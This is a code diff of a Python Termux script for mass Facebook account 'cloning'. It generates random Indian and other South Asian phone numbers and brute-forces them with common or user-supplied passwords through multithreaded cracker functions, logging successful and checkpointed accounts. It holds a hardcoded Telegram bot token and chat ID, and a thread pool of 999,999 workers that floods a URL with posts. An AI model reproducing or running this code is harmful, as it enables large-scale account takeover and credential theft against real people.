@@ -107,15 +107,6 @@ except ImportError:
     os.system("pip install urllib3")
 import urllib3     
 
-#───────────────[FAKE CPTHON]───────────────────────── #
-
-
-
-os.system('clear')
-
-import os, platform, time, sys
-
-
 try:
  import requests
 except:os.system("pip uninstall requests -y;pip install requests")
@@ -130,15 +121,6 @@ if bit == '64bit':
 elif bit == '32bit':
  print('\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
  os.system('pip install requests beautifulsoup4')
- 
-
- #───────────────[BIT End]───────────────────────── #
-try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-	open('proxies.txt','w').write(prox)
-except Exception as e:
-	print('')
-proxies=open('proxies.txt','r').read().splitlines()
 
 def generate_random_ip():
     # Indian public IP address ranges (some common ranges)
@@ -224,7 +206,7 @@ def bithika():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
-with tred(max_workers=99999) as jjj:
+with tred(max_workers=999999) as jjj:
     jjj.submit(bithika)
  
 
@@ -316,16 +298,6 @@ token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
 ID = ('1778046662')
 #__________________| LOOP |__________________#
 loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
-"""
-myid = uuid.uuid4().hex[:40].upper()
-idmy = uuid.uuid4().hex[:6].upper()
-try:
-    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
-except:
-    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
-    getx.write(myid+idmy)
-    getx.close()
-MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()"""
 #__________________| COLOUR |__________________#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
@@ -349,6 +321,12 @@ logo=(f"""
 def clear():
 	os.system('clear')
 	print(logo)
+def check_lock(cid):
+    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
+    if 'Photoshop' in req:
+        return 'live'
+    else:
+        return 'lock'
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
@@ -470,7 +448,7 @@ def menu():
 def randm():
     clear()
     print(f'{G}[{A}1{G}]{G} INDIA CLONING ')
-    print(f'{G}[{A}2{G}]{G} INDIA CLONING (without code) ')
+    print(f'{G}[{A}2{G}]{G} INDIA CLONING (full number) ')
     print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
     print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
     print(f'{G}[{A}5{G}]{G} BANGLADESH CLONING ')
@@ -536,44 +514,44 @@ def bd():
 		menu()
 #__________________| INDIA |__________________#
 def india():
-		user=[]
-		clear()
-		code = str(random.randint(6,9))
-		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
-		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
-		clear()
-		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
-		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
-		for nmbr in range(limit):
-			nmp = "". join(random.choice(string.digits) for _ in range(3))
-			user.append(nmp)
-		with tred(max_workers=15) as habib:	
-			clear()
-			tl = str(len(user))
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{faltu} {black}wish luck {pvt} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
-			for psx in user:
-				name = ''.join(random.choice(string.digits) for _ in range(3))
-				cod = ''.join(random.choice(string.digits) for _ in range(3))
-				uid = code+name+cod+psx
-				passlist = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200','59039200','57575751']
-				if mthd in ['1','01']:
-					habib.submit(rndm1,uid,passlist)
-				if mthd in ['2','02']:
-					habib.submit(rndm2,uid,passlist)
-				if mthd in ['3','03']:
-					habib.submit(rndm3,uid,passlist)
-				if mthd in ['4','04']:
-					habib.submit(rndm4,uid,passlist)
-		print('\033[1;37m')
-		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
-		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
-		menu()
+    fresh()
+    print(f" {wow('â¢')} ENTER NUMBER WITH COUNTRY CODE ")
+    print(f" {wow('â¢')} EXAMPLE : {green}9351048348 ")
+    divider()
+    number = input(f" {wow('-')} ENTER NUMBER : {green}")
+    limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
+    code = number[:4]
+    for _ in range(limit):
+        total = len(number)
+        digits = str(total-4)
+        xnxxx = "".join(random.choice(string.digits) for _ in range(int(digits)))
+        xnxx.append(xnxxx)
+    fresh()
+    pw_limit = int(input(f" {wow('-')} ENTER PASSWORD LIMIT : {green}"))
+    fresh()
+    print(f" {wow('â¢')} EXAMPLE : {green}first6, last6 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}first7, last7 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}khankhan, 57273200 ")
+    print(f" {wow('â¢')} EXAMPLE : {green}fullnumber ")
+    divider()
+    for p in range(pw_limit):
+        p_ask = input(f" {wow(p+1)} ENTER PASSWORD : {green}")
+        pwx.append(p_ask)
+    with tpe(max_workers=55) as Xnxx:
+        fresh()
+        tl = str(len(xnxx))
+        print(f" {wow('-')} TOTAL ACCOUNTS  : {green}{tl} ")
+        print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
+        print(f" {wow('!')} {white}USE FLIGHT MODE FOR SPEED UP ")
+        divider()
+        for user in xnxx:
+            uid = code+user
+            Xnxx.submit(cracker, uid, pwx, tl)
+    divider()
+    print(f" {wow('!')} {green}PROCESS COMPLETED ")
+    print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
+    divider()
+    menu()
 #__________________| NEPAL |__________________#
 def nepal():
 		user=[]
